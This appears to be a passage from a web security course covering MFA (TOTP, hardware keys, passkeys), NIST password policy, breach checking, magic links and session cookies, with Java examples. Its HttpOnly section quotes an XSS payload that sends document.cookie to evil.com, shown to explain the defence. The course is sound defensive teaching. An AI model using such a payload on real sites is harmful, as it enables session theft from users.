### TOTP Implementation in Java

```java
// Using the 'com.warrenstrange:googleauth' library
// Maven: com.warrenstrange:googleauth:1.5.0

import com.warrenstrange.googleauth.GoogleAuthenticator;
import com.warrenstrange.googleauth.GoogleAuthenticatorKey;
import com.warrenstrange.googleauth.GoogleAuthenticatorQRGenerator;

@Service
public class TotpService {
    
    private final GoogleAuthenticator gAuth = new GoogleAuthenticator();
    private final UserRepository userRepository;
    
    /**
     * Enable TOTP for a user - returns QR code URL
     */
    public TotpSetupResponse enableTotp(Long userId) {
        User user = userRepository.findById(userId)
            .orElseThrow(() -> new UserNotFoundException(userId));
        
        // Generate secret key
        GoogleAuthenticatorKey key = gAuth.createCredentials();
        String secret = key.getKey();  // e.g., "JBSWY3DPEHPK3PXP"
        
        // Store secret (ENCRYPTED!) in database
        user.setTotpSecret(encryptionService.encrypt(secret));
        user.setTotpEnabled(false);  // Not enabled until verified
        userRepository.save(user);
        
        // Generate QR code URL for authenticator app
        String qrCodeUrl = GoogleAuthenticatorQRGenerator.getOtpAuthTotpURL(
            "MyApp",           // Issuer (your app name)
            user.getEmail(),   // Account name
            key                // Contains the secret
        );
        
        // Also provide manual entry option
        return new TotpSetupResponse(qrCodeUrl, secret);
    }
    
    /**
     * Verify TOTP code and enable MFA
     */
    public boolean verifyAndEnableTotp(Long userId, int code) {
        User user = userRepository.findById(userId)
            .orElseThrow(() -> new UserNotFoundException(userId));
        
        String secret = encryptionService.decrypt(user.getTotpSecret());
        
        // Verify the code
        boolean valid = gAuth.authorize(secret, code);
        
        if (valid) {
            user.setTotpEnabled(true);
            userRepository.save(user);
            
            // Generate backup codes
            generateBackupCodes(user);
        }
        
        return valid;
    }
    
    /**
     * Verify TOTP during login
     */
    public boolean verifyTotp(Long userId, int code) {
        User user = userRepository.findById(userId)
            .orElseThrow(() -> new UserNotFoundException(userId));
        
        if (!user.isTotpEnabled()) {
            throw new TotpNotEnabledException();
        }
        
        String secret = encryptionService.decrypt(user.getTotpSecret());
        return gAuth.authorize(secret, code);
    }
    
    /**
     * Generate one-time backup codes (store hashed!)
     */
    private void generateBackupCodes(User user) {
        List<String> codes = new ArrayList<>();
        SecureRandom random = new SecureRandom();
        
        for (int i = 0; i < 10; i++) {
            // Generate 8-character alphanumeric code
            String code = String.format("%08d", random.nextInt(100000000));
            codes.add(code);
            
            // Store HASHED (these are like passwords!)
            BackupCode backupCode = new BackupCode();
            backupCode.setUser(user);
            backupCode.setCodeHash(passwordEncoder.encode(code));
            backupCode.setUsed(false);
            backupCodeRepository.save(backupCode);
        }
        
        // Show codes to user ONCE (they must save them)
        // After this, we only have hashes
    }
}
```

### Hardware Security Keys (FIDO2/WebAuthn)
```
┌─────────────────────────────────────────────────────────────────────────┐
│                  HARDWARE SECURITY KEYS (✅✅ STRONGEST)                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Devices: YubiKey, Google Titan, Feitian, SoloKeys                      │
│  Protocols: FIDO2 / WebAuthn (modern), U2F (older)                      │
│                                                                         │
│  HOW IT WORKS:                                                          │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │                                                                 │    │
│  │  Registration:                                                  │    │
│  │  1. Server sends challenge (random bytes)                       │    │
│  │  2. Security key generates NEW key pair for this site           │    │
│  │  3. Key signs challenge with private key                        │    │
│  │  4. Server stores public key                                    │    │
│  │                                                                 │    │
│  │  Login:                                                         │    │
│  │  1. Server sends challenge                                      │    │
│  │  2. User touches security key                                   │    │
│  │  3. Key signs challenge with private key                        │    │
│  │  4. Server verifies signature with stored public key            │    │
│  │                                                                 │    │
│  │  CRITICAL: Key checks ORIGIN (domain)!                          │    │
│  │  Phishing site can't use the credential - wrong origin!         │    │
│  │                                                                 │    │
│  └─────────────────────────────────────────────────────────────────┘    │
│                                                                         │
│  WHY IT'S STRONGEST:                                                    │
│  • PHISHING RESISTANT: Key verifies the actual domain                   │
│  • No shared secrets: Only public key on server                         │
│  • Physical presence: Must touch/tap the device                         │
│  • No network: Works offline, no SMS/internet needed                    │
│                                                                         │
│  GOOGLE'S EXPERIENCE:                                                   │
│  After deploying security keys to 85,000+ employees:                    │
│  "Zero successful phishing attacks" - Google Security Blog, 2018        │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### MFA Method Comparison
```
┌───────────────┬───────────┬────────────┬────────────┬──────────────────┐
│ Method        │ Phishing  │ SIM Swap   │ Ease of    │ Cost             │
│               │ Resistant │ Resistant  │ Use        │                  │
├───────────────┼───────────┼────────────┼────────────┼──────────────────┤
│ SMS OTP       │    ❌     │    ❌      │    ✅✅   │ Free             │
├───────────────┼───────────┼────────────┼────────────┼──────────────────┤
│ Email OTP     │    ❌     │    ✅      │    ✅✅   │ Free             │
├───────────────┼───────────┼────────────┼────────────┼──────────────────┤
│ TOTP App      │    ❌     │    ✅      │    ✅     │ Free             │
├───────────────┼───────────┼────────────┼────────────┼──────────────────┤
│ Push Notify   │    ⚠️     │    ✅      │    ✅✅   │ Free/Paid        │
├───────────────┼───────────┼────────────┼────────────┼──────────────────┤
│ Hardware Key  │    ✅     │    ✅      │    ✅     │ $25-50 per key   │
├───────────────┼───────────┼────────────┼────────────┼──────────────────┤
│ Passkeys      │    ✅     │    ✅      │    ✅✅   │ Free             │
└───────────────┴───────────┴────────────┴────────────┴──────────────────┘
```

RECOMMENDATION BY USE CASE:
- Consumer apps: TOTP or Passkeys
- Enterprise: Hardware keys for admins, TOTP for others
- High-security: Hardware keys mandatory
- Legacy/compatibility: SMS (if nothing else works)

---

## 4. PASSWORD POLICIES - NIST 2024 Guidelines

### The Old Way (WRONG!) ❌
```
OLD PASSWORD POLICIES (pre-2017) - DON'T DO THIS:

┌─────────────────────────────────────────────────────────────────────────┐
│                                                                         │
│  ❌ "Password must contain:"                                            │
│     • Uppercase letter                                                  │
│     • Lowercase letter                                                  │
│     • Number                                                            │
│     • Special character (!@#$%^&*)                                      │
│     • Minimum 8 characters                                              │
│     • Change every 90 days                                              │
│     • Cannot reuse last 10 passwords                                    │
│                                                                         │
│  RESULT:                                                                │
│  • Users create: "Password1!" → "Password2!" → "Password3!"             │
│  • Or: "P@ssw0rd" "Summer2024!" "Company123!"                           │
│  • Predictable patterns that attackers know                             │
│  • Users write passwords on sticky notes                                │
│  • Frequent resets increase help desk costs                             │
│                                                                         │
│  RESEARCH SHOWED: Complex rules DON'T improve security!                 │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### The New Way (NIST SP 800-63B) ✅
```
MODERN PASSWORD POLICIES (NIST 2017, updated 2024):

┌─────────────────────────────────────────────────────────────────────────┐
│                                                                         │
│  ✅ DO:                                                                 │
│                                                                         │
│  • Minimum 8 characters (NIST), 12-15 recommended                       │
│  • Maximum 64+ characters (allow passphrases!)                          │
│  • Allow ALL printable characters including spaces                      │
│  • Allow Unicode (emoji passwords are fine: "🔐MyD0g🐕!")               │
│  • Check against breached password lists (HIBP)                         │
│  • Check against common passwords (password, 123456, qwerty)            │
│  • Check against context-specific words (company name, username)        │
│  • Allow paste into password fields (password managers!)                │
│  • Show password strength meter                                         │
│  • Offer "show password" toggle                                         │
│                                                                         │
│  ❌ DON'T:                                                              │
│                                                                         │
│  • Require specific character types                                     │
│  • Force periodic password changes (unless compromised)                 │
│  • Use password hints or security questions                             │
│  • Truncate passwords                                                   │
│  • Block paste in password fields                                       │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Why Length > Complexity
```
ENTROPY COMPARISON:

Password: "P@ssw0rd"
- 8 characters
- Looks "complex" but is predictable
- In every password cracking dictionary
- Cracked in: SECONDS

Passphrase: "correct horse battery staple"
- 28 characters
- Easy to remember
- High entropy (random word combination)
- Cracked in: CENTURIES

┌─────────────────────────────────────────────────────────────────────────┐
│                                                                         │
│  MATH:                                                                  │
│                                                                         │
│  "P@ssw0rd" (8 chars, ~95 possible each)                                │
│  Theoretical: 95^8 = 6.6 quadrillion combinations                       │
│  Reality: It's in dictionary lists, cracked instantly                   │
│                                                                         │
│  "correct horse battery staple" (4 random words from 7,776 word list)   │
│  Combinations: 7,776^4 = 3.6 quadrillion combinations                   │
│  Reality: NOT in dictionaries, actually requires brute force            │
│                                                                         │
│  SAME theoretical strength, but passphrase is:                          │
│  • Easier to remember                                                   │
│  • Harder to crack in practice                                          │
│  • Less likely to be written down                                       │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Implementing Modern Password Validation



```java
@Service
public class PasswordPolicyService {
    
    private static final int MIN_LENGTH = 12;
    private static final int MAX_LENGTH = 128;
    
    private final PwnedPasswordsClient pwnedClient;  // HIBP API
    private final Set<String> commonPasswords;        // Top 100k passwords
    
    /**
     * Validate password against NIST guidelines
     */
    public PasswordValidationResult validate(String password, User user) {
        List<String> errors = new ArrayList<>();
        
        // Length check
        if (password.length() < MIN_LENGTH) {
            errors.add("Password must be at least " + MIN_LENGTH + " characters");
        }
        if (password.length() > MAX_LENGTH) {
            errors.add("Password cannot exceed " + MAX_LENGTH + " characters");
        }
        
        // Context-specific check (username, email, company name)
        String lowerPassword = password.toLowerCase();
        if (user.getUsername() != null && 
            lowerPassword.contains(user.getUsername().toLowerCase())) {
            errors.add("Password cannot contain your username");
        }
        if (user.getEmail() != null) {
            String emailPrefix = user.getEmail().split("@")[0].toLowerCase();
            if (lowerPassword.contains(emailPrefix)) {
                errors.add("Password cannot contain your email");
            }
        }
        
        // Common password check
        if (commonPasswords.contains(lowerPassword)) {
            errors.add("This password is too common. Please choose a different one");
        }
        
        // Breached password check (async in production)
        if (pwnedClient.isPasswordBreached(password)) {
            errors.add("This password has appeared in a data breach. " +
                       "Please choose a different one");
        }
        
        // Repetitive/sequential patterns
        if (hasRepetitivePattern(password)) {
            errors.add("Password cannot be a repetitive pattern like 'aaaaaa' or '123123'");
        }
        
        return new PasswordValidationResult(errors.isEmpty(), errors);
    }
    
    private boolean hasRepetitivePattern(String password) {
        // Check for repeated characters: "aaaaaaa"
        if (password.matches("^(.)\\1+$")) return true;
        
        // Check for sequential: "123456", "abcdef"
        if (isSequential(password)) return true;
        
        // Check for repeated patterns: "abcabc"
        for (int len = 1; len <= password.length() / 2; len++) {
            String pattern = password.substring(0, len);
            String repeated = pattern.repeat(password.length() / len);
            if (password.startsWith(repeated)) return true;
        }
        
        return false;
    }
    
    private boolean isSequential(String password) {
        if (password.length() < 4) return false;
        
        boolean allIncreasing = true;
        boolean allDecreasing = true;
        
        for (int i = 1; i < password.length(); i++) {
            int diff = password.charAt(i) - password.charAt(i - 1);
            if (diff != 1) allIncreasing = false;
            if (diff != -1) allDecreasing = false;
        }
        
        return allIncreasing || allDecreasing;
    }
}
```

### Have I Been ``Pwned`` Integration


```java
@Service
public class PwnedPasswordsClient {
    
    private final RestTemplate restTemplate;
    
    /**
     * Check if password appears in breaches using k-Anonymity model
     * 
     * We don't send the actual password!
     * 1. Hash password with SHA-1
     * 2. Send first 5 characters to API
     * 3. API returns all hashes starting with those 5 chars
     * 4. We check locally if our full hash is in the list
     */
    public boolean isPasswordBreached(String password) {
        try {
            // Hash the password
            String sha1Hash = DigestUtils.sha1Hex(password).toUpperCase();
            String prefix = sha1Hash.substring(0, 5);   // First 5 chars
            String suffix = sha1Hash.substring(5);       // Rest of hash
            
            // Query API with prefix only (k-Anonymity)
            String url = "https://api.pwnedpasswords.com/range/" + prefix;
            String response = restTemplate.getForObject(url, String.class);
            
            // Check if our suffix is in the response
            // Response format: "SUFFIX:COUNT\r\nSUFFIX:COUNT\r\n..."
            for (String line : response.split("\r\n")) {
                String[] parts = line.split(":");
                if (parts[0].equals(suffix)) {
                    int count = Integer.parseInt(parts[1]);
                    log.warn("Password found in {} breaches", count);
                    return true;
                }
            }
            
            return false;
            
        } catch (Exception e) {
            log.error("Error checking HIBP", e);
            return false;  // Fail open (don't block registration if API is down)
        }
    }
}
```

---

## 5. PASSWORDLESS AUTHENTICATION

### The Problem with Passwords
```
┌─────────────────────────────────────────────────────────────────────────┐
│                    WHY PASSWORDS ARE PROBLEMATIC                        │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  FOR USERS:                                                             │
│  • Average person has 100+ online accounts                              │
│  • Can't remember unique strong passwords for each                      │
│  • Password manager adoption is still low                               │
│  • Forgotten password = friction = lost customers                       │
│                                                                         │
│  FOR SECURITY:                                                          │
│  • 81% of breaches involve weak/stolen passwords (Verizon DBIR)         │
│  • Phishing attacks steal passwords easily                              │
│  • Credential stuffing: leaked passwords tried everywhere               │
│  • Password spraying: common passwords tried on many accounts           │
│                                                                         │
│  SOLUTION: Eliminate passwords entirely!                                │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### WebAuthn / Passkeys
```
┌─────────────────────────────────────────────────────────────────────────┐
│                      PASSKEYS (The Future)                              │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  Passkeys = WebAuthn credentials synced across devices                  │
│  Supported by: Apple, Google, Microsoft (2022+)                         │
│                                                                         │
│  HOW IT WORKS:                                                          │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │                                                                 │   │
│  │  Registration:                                                  │   │
│  │  1. User clicks "Create Passkey"                                │   │
│  │  2. Device prompts for biometric (Face ID / fingerprint)        │   │
│  │  3. Device creates key pair for this site                       │   │
│  │  4. Public key sent to server                                   │   │
│  │  5. Private key stored in device's secure enclave               │   │
│  │  6. Passkey synced to user's cloud (iCloud, Google Password Mgr)│   │
│  │                                                                 │   │
│  │  Login:                                                         │   │
│  │  1. User clicks "Sign in with Passkey"                          │   │
│  │  2. Device prompts for biometric                                │   │
│  │  3. Device signs challenge with private key                     │   │
│  │  4. Server verifies with stored public key                      │   │
│  │  5. User is logged in!                                          │   │
│  │                                                                 │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  USER EXPERIENCE:                                                       │
│  • No password to create or remember                                    │
│  • Just use fingerprint or face                                         │
│  • Works across all devices (synced)                                    │
│  • Can use phone to sign in on laptop (cross-device)                    │
│                                                                         │
│  SECURITY:                                                              │
│  • Phishing resistant (origin bound)                                    │
│  • No shared secrets                                                    │
│  • Private key never leaves device                                      │
│  • Biometric is local verification only                                 │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Passkey Flow Diagram
```
REGISTRATION:

┌──────────┐                    ┌──────────┐                    ┌──────────┐
│  USER    │                    │ BROWSER  │                    │  SERVER  │
└────┬─────┘                    └────┬─────┘                    └────┬─────┘
     │                               │                               │
     │  Click "Create Passkey"       │                               │
     │──────────────────────────────►│                               │
     │                               │    Request challenge          │
     │                               │──────────────────────────────►│
     │                               │                               │
     │                               │◄────── Challenge + options ───│
     │                               │                               │
     │◄─── Prompt: Use Face ID? ─────│                               │
     │                               │                               │
     │──── [User approves] ─────────►│                               │
     │                               │                               │
     │     Device creates key pair   │                               │
     │     Signs challenge           │                               │
     │                               │                               │
     │                               │─── Public key + signed resp ─►│
     │                               │                               │
     │                               │            Store public key   │
     │                               │                               │
     │                               │◄────────── Success ───────────│
     │◄─── "Passkey created!" ───────│                               │


AUTHENTICATION:

┌──────────┐                    ┌──────────┐                    ┌──────────┐
│  USER    │                    │ BROWSER  │                    │  SERVER  │
└────┬─────┘                    └────┬─────┘                    └────┬─────┘
     │                               │                               │
     │  Click "Sign in"              │                               │
     │──────────────────────────────►│    Request challenge          │
     │                               │──────────────────────────────►│
     │                               │                               │
     │                               │◄────── Challenge ─────────────│
     │                               │                               │
     │◄─── Prompt: Use Face ID? ─────│                               │
     │                               │                               │
     │──── [User approves] ─────────►│                               │
     │                               │                               │
     │     Device signs challenge    │                               │
     │     with private key          │                               │
     │                               │                               │
     │                               │───── Signed response ────────►│
     │                               │                               │
     │                               │      Verify with public key   │
     │                               │                               │
     │                               │◄────── Auth token ────────────│
     │◄───── "Welcome back!" ────────│                               │
```

### Magic Links (Email-Based Passwordless)
```
┌─────────────────────────────────────────────────────────────────────────┐
│                      MAGIC LINKS (Simple Passwordless)                  │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  FLOW:                                                                  │
│  1. User enters email                                                   │
│  2. Server generates secure random token                                │
│  3. Server sends email with link: https://app.com/auth?token=abc123    │
│  4. User clicks link                                                    │
│  5. Server validates token, creates session                             │
│                                                                         │
│  IMPLEMENTATION:                                                        │
│                                                                         │
│  @Service                                                               │
│  public class MagicLinkService {                                        │
│                                                                         │
│      public void sendMagicLink(String email) {                          │
│          User user = userRepository.findByEmail(email)                  │
│              .orElseThrow();                                            │
│                                                                         │
│          // Generate secure token                                       │
│          String token = generateSecureToken();  // 32+ bytes, Base64   │
│                                                                         │
│          // Store with expiration (15 minutes)                          │
│          MagicLink link = new MagicLink();                              │
│          link.setToken(hashToken(token));  // Store HASHED!            │
│          link.setUserId(user.getId());                                  │
│          link.setExpiresAt(Instant.now().plusMinutes(15));             │
│          link.setUsed(false);                                           │
│          magicLinkRepository.save(link);                                │
│                                                                         │
│          // Send email                                                  │
│          String url = "https://app.com/auth/magic?token=" + token;     │
│          emailService.send(email, "Sign in to App", url);              │
│      }                                                                  │
│                                                                         │
│      public Authentication verifyMagicLink(String token) {              │
│          String hashedToken = hashToken(token);                         │
│                                                                         │
│          MagicLink link = magicLinkRepository                           │
│              .findByTokenAndUsedFalse(hashedToken)                      │
│              .orElseThrow(() -> new InvalidTokenException());           │
│                                                                         │
│          if (link.getExpiresAt().isBefore(Instant.now())) {            │
│              throw new TokenExpiredException();                         │
│          }                                                              │
│                                                                         │
│          // Mark as used (one-time use!)                                │
│          link.setUsed(true);                                            │
│          magicLinkRepository.save(link);                                │
│                                                                         │
│          // Create session                                              │
│          User user = userRepository.findById(link.getUserId()).get();  │
│          return createAuthentication(user);                             │
│      }                                                                  │
│  }                                                                      │
│                                                                         │
│  SECURITY CONSIDERATIONS:                                               │
│  • Token must be cryptographically random (SecureRandom)                │
│  • Store token HASHED in database                                       │
│  • Short expiration (15-30 minutes)                                     │
│  • One-time use only                                                    │
│  • Rate limit requests per email                                        │
│  • Email security becomes critical!                                     │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 6. BIOMETRIC AUTHENTICATION
```
┌─────────────────────────────────────────────────────────────────────────┐
│                    BIOMETRICS - IMPORTANT NUANCES                       │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  COMMON MISCONCEPTION:                                                  │
│  "My fingerprint is my password"                                        │
│                                                                         │
│  REALITY:                                                               │
│  Biometric is LOCAL VERIFICATION, not authentication to server!        │
│                                                                         │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │                                                                 │   │
│  │  WHAT ACTUALLY HAPPENS (WebAuthn/Passkeys):                     │   │
│  │                                                                 │   │
│  │  1. Server sends challenge                                      │   │
│  │  2. Device says "Verify yourself to use the private key"        │   │
│  │  3. User provides fingerprint/face (LOCAL check)                │   │
│  │  4. Device unlocks private key in secure enclave                │   │
│  │  5. Device signs challenge with private key                     │   │
│  │  6. Signature sent to server (NOT the biometric!)               │   │
│  │                                                                 │   │
│  │  Your fingerprint NEVER leaves your device!                     │   │
│  │  Server never sees biometric data!                              │   │
│  │                                                                 │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  BIOMETRIC CONSIDERATIONS:                                              │
│                                                                         │
│  ✅ ADVANTAGES:                                                         │
│  • Convenient (always with you)                                         │
│  • Hard to share or delegate                                            │
│  • Fast authentication                                                  │
│                                                                         │
│  ❌ DISADVANTAGES:                                                      │
│  • CANNOT BE CHANGED if compromised                                     │
│  • False acceptance/rejection rates                                     │
│  • Privacy concerns (government surveillance)                           │
│  • Can be coerced (forced to unlock)                                    │
│  • Spoofing possible (photos, fingerprint molds)                        │
│                                                                         │
│  BEST PRACTICE:                                                         │
│  Use biometrics as LOCAL unlock, not as the authentication itself.      │
│  Biometric + cryptographic key = secure                                 │
│  Biometric alone = problematic                                          │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
````

---

## 7. AUTHENTICATION FLOW BEST PRACTICES

```java
@RestController
@RequestMapping("/api/auth")
public class AuthController {
    
    private final AuthenticationService authService;
    private final RateLimiter rateLimiter;
    
    /**
     * Complete login flow with MFA support
     */
    @PostMapping("/login")
    public ResponseEntity<?> login(
            @Valid @RequestBody LoginRequest request,
            HttpServletRequest httpRequest) {
        
        String clientIp = getClientIp(httpRequest);
        
        // Rate limiting by IP and username
        if (!rateLimiter.tryAcquire(clientIp, request.getUsername())) {
            return ResponseEntity.status(429)
                .body(new ErrorResponse("Too many login attempts. Try again later."));
        }
        
        try {
            // Step 1: Verify credentials
            AuthResult result = authService.authenticate(
                request.getUsername(), 
                request.getPassword()
            );
            
            if (!result.isSuccess()) {
                // Don't reveal if username exists
                return ResponseEntity.status(401)
                    .body(new ErrorResponse("Invalid credentials"));
            }
            
            User user = result.getUser();
            
            // Step 2: Check if MFA is required
            if (user.isMfaEnabled()) {
                // Return partial token, require MFA completion
                String mfaToken = authService.createMfaToken(user);
                return ResponseEntity.ok(new MfaRequiredResponse(mfaToken, user.getMfaType()));
            }
            
            // Step 3: Create session/token
            TokenResponse tokens = authService.createTokens(user);
            
            // Audit log
            auditLog.log("LOGIN_SUCCESS", user.getId(), clientIp);
            
            return ResponseEntity.ok(tokens);
            
        } catch (AccountLockedException e) {
            return ResponseEntity.status(423)
                .body(new ErrorResponse("Account locked. Contact support."));
        }
    }
    
    /**
     * MFA verification step
     */
    @PostMapping("/mfa/verify")
    public ResponseEntity<?> verifyMfa(
            @Valid @RequestBody MfaVerifyRequest request,
            HttpServletRequest httpRequest) {
        
        String clientIp = getClientIp(httpRequest);
        
        try {
            // Validate MFA token
            MfaSession session = authService.validateMfaToken(request.getMfaToken());
            
            // Verify MFA code
            boolean valid = switch (session.getMfaType()) {
                case TOTP -> totpService.verify(session.getUserId(), request.getCode());
                case SMS -> smsService.verify(session.getUserId(), request.getCode());
                case HARDWARE_KEY -> webAuthnService.verify(session.getUserId(), request.getAssertion());
                default -> throw new UnsupportedMfaTypeException();
            };
            
            if (!valid) {
                auditLog.log("MFA_FAILED", session.getUserId(), clientIp);
                return ResponseEntity.status(401)
                    .body(new ErrorResponse("Invalid verification code"));
            }
            
            // MFA passed - create full session
            User user = userRepository.findById(session.getUserId()).get();
            TokenResponse tokens = authService.createTokens(user);
            
            auditLog.log("MFA_SUCCESS", user.getId(), clientIp);
            
            return ResponseEntity.ok(tokens);
            
        } catch (InvalidMfaTokenException e) {
            return ResponseEntity.status(401)
                .body(new ErrorResponse("Invalid or expired MFA session"));
        }
    }
    
    /**
     * Logout - invalidate tokens
     */
    @PostMapping("/logout")
    @PreAuthorize("isAuthenticated()")
    public ResponseEntity<?> logout(
            @RequestHeader("Authorization") String authHeader,
            @AuthenticationPrincipal UserDetails user) {
        
        String token = authHeader.replace("Bearer ", "");
        authService.invalidateToken(token);
        
        auditLog.log("LOGOUT", user.getUsername());
        
        return ResponseEntity.ok().build();
    }
}
```

---

## ✅ SECURITY CHECKLIST FOR SESSION 5
```
□ Understand: Authentication ≠ Authorization
□ Implement MFA (TOTP minimum, hardware keys for high-security)
□ Follow NIST password guidelines (length > complexity)
□ Check passwords against breach lists (HIBP)
□ Rate limit authentication attempts
□ Implement account lockout with progressive delays
□ Don't reveal if username exists (prevent enumeration)
□ Log all authentication events
□ Use constant-time comparisons
□ Consider passwordless options for new projects
□ Biometrics for local unlock, not server authentication
```

---

## 🚫 COMMON MISTAKES
```
1. "We require special characters, that's secure enough"
   → Complexity rules don't help. Length and breach checking do.

2. "SMS OTP is two-factor authentication, we're safe"
   → SMS is weakest MFA. SIM swapping is real. Use TOTP or hardware keys.

3. "Biometric authentication sends fingerprint to server"
   → NO! Biometric is local unlock. Private key signs the challenge.

4. "We force password changes every 90 days"
   → NIST says DON'T. Only force change on suspected compromise.

5. "401 means unauthorized"
   → Confusing terminology. 401 = unauthenticated. 403 = unauthorized.

6. "Password reset questions add security"
   → Security questions are easily researched. Don't use them.

7. "We hash the TOTP secret with the password hash"
   → TOTP secret needs to be readable for code generation. Encrypt, don't hash.
```

---


## SESSION 5 COMPLETE

**Key Takeaways:**
- Authentication (prove who you are) ≠ Authorization (what you can do)
- Three factors: Something you Know, Have, Are
- MFA dramatically reduces account takeover - implement it!
- NIST 2024: Length > Complexity, no forced rotation
- Passkeys are the future - phishing resistant, convenient
- Biometrics are local verification, not server authentication

# SESSION 6: SESSION-BASED AUTHENTICATION Stateful Authentication - Cookies, Sessions & Their Vulnerabilities

## 1. WHY SESSIONS EXIST - HTTP is Stateless

```
THE PROBLEM:

┌─────────────────────────────────────────────────────────────────────────┐
│                                                                         │
│  HTTP is STATELESS - server doesn't remember previous requests          │
│                                                                         │
│  Request 1: POST /login (username=deniz, password=****)                 │
│  Response:  "Login successful!"                                         │
│                                                                         │
│  Request 2: GET /dashboard                                              │
│  Response:  "Who are you? Please login."  😕                            │
│                                                                         │
│  Server has NO MEMORY of Request 1 when processing Request 2!           │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘


THE SOLUTION: Sessions

┌─────────────────────────────────────────────────────────────────────────┐
│                                                                         │
│  Request 1: POST /login (username=deniz, password=****)                 │
│  Server:    Creates session, stores: {userId: 123, role: "USER"}        │
│             Generates session ID: "abc123xyz"                           │
│  Response:  Set-Cookie: JSESSIONID=abc123xyz                            │
│                                                                         │
│  Request 2: GET /dashboard                                              │
│             Cookie: JSESSIONID=abc123xyz                                │
│  Server:    Looks up "abc123xyz" → finds {userId: 123, role: "USER"}    │
│  Response:  "Welcome back, Deniz!"  ✅                                  │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Session Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      SESSION-BASED AUTHENTICATION                       │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   CLIENT (Browser)                         SERVER                       │
│   ┌─────────────────┐                     ┌─────────────────────────┐  │
│   │                 │                     │                         │  │
│   │  Cookie:        │                     │  Session Store:         │  │
│   │  JSESSIONID=    │────── matches ─────►│  ┌───────────────────┐  │  │
│   │  "abc123xyz"    │                     │  │ "abc123xyz" → {   │  │  │
│   │                 │                     │  │   userId: 123,    │  │  │
│   │  (Just an ID,   │                     │  │   role: "USER",   │  │  │
│   │   no data)      │                     │  │   createdAt: ..., │  │  │
│   │                 │                     │  │   lastAccess: ... │  │  │
│   └─────────────────┘                     │  │ }                 │  │  │
│                                           │  └───────────────────┘  │  │
│                                           │                         │  │
│                                           │  Session data lives     │  │
│                                           │  on SERVER, not client  │  │
│                                           └─────────────────────────┘  │
│                                                                         │
│   KEY INSIGHT:                                                          │
│   • Client only holds the SESSION ID (like a coat check ticket)         │
│   • Server holds all the actual DATA (like the actual coat)             │
│   • This is STATEFUL - server must maintain state                       │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---
## 2. HTTP COOKIES - Deep Dive

### Cookie Basics

```
HTTP COOKIE ANATOMY:

Set-Cookie: JSESSIONID=abc123xyz; Path=/; HttpOnly; Secure; SameSite=Strict; Max-Age=3600
            └───────┬────────────┘ └──┬─┘  └───┬──┘  └──┬─┘  └─────┬─────┘  └────┬────┘
                    │                 │        │        │          │             │
              Name=Value            Path    HttpOnly  Secure   SameSite      Expiry


COOKIE FLOW:

┌──────────┐                                              ┌──────────┐
│  CLIENT  │                                              │  SERVER  │
└────┬─────┘                                              └────┬─────┘
     │                                                         │
     │  1. POST /login                                         │
     │────────────────────────────────────────────────────────►│
     │                                                         │
     │  2. HTTP/1.1 200 OK                                     │
     │     Set-Cookie: JSESSIONID=abc123; HttpOnly; Secure     │
     │◄────────────────────────────────────────────────────────│
     │                                                         │
     │     Browser automatically stores cookie                 │
     │                                                         │
     │  3. GET /api/data                                       │
     │     Cookie: JSESSIONID=abc123                           │
     │────────────────────────────────────────────────────────►│
     │                                                         │
     │     Browser automatically sends cookie on every request │
     │     to same domain                                      │
```

### Cookie Security Attributes

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      COOKIE SECURITY ATTRIBUTES                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  HttpOnly                                                       │   │
│  ├─────────────────────────────────────────────────────────────────┤   │
│  │                                                                 │   │
│  │  WITHOUT HttpOnly:                                              │   │
│  │  <script>                                                       │   │
│  │    // Attacker's XSS payload                                    │   │
│  │    fetch('https://evil.com/steal?cookie=' + document.cookie);   │   │
│  │  </script>                                                      │   │
│  │  → Session stolen! 😱                                           │   │
│  │                                                                 │   │
│  │  WITH HttpOnly:                                                 │   │
│  │  <script>                                                       │   │
│  │    console.log(document.cookie);  // JSESSIONID not visible!   │   │
│  │  </script>                                                      │   │
│  │  → JavaScript cannot access the cookie ✅                       │   │
│  │                                                                 │   │
│  │  RULE: ALWAYS set HttpOnly for session cookies                  │   │
│  │                                                                 │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  Secure                                                         │   │
│  ├─────────────────────────────────────────────────────────────────┤   │
│  │                                                                 │   │
│  │  WITHOUT Secure:                                                │   │
│  │  Cookie sent over HTTP and HTTPS                                │   │
│  │  → Attacker on same WiFi intercepts HTTP traffic                │   │
│  │  → Session stolen! (Firesheep attack)                           │   │
│  │                                                                 │   │
│  │  WITH Secure:                                                   │   │
│  │  Cookie ONLY sent over HTTPS                                    │   │
│  │  → Even if HTTP request happens, cookie not included            │   │
│  │                                                                 │   │
│  │  RULE: ALWAYS set Secure in production                          │   │
│  │        (can skip in localhost for development)                  │   │
│  │                                                                 │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                         │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │  SameSite                                                       │   │
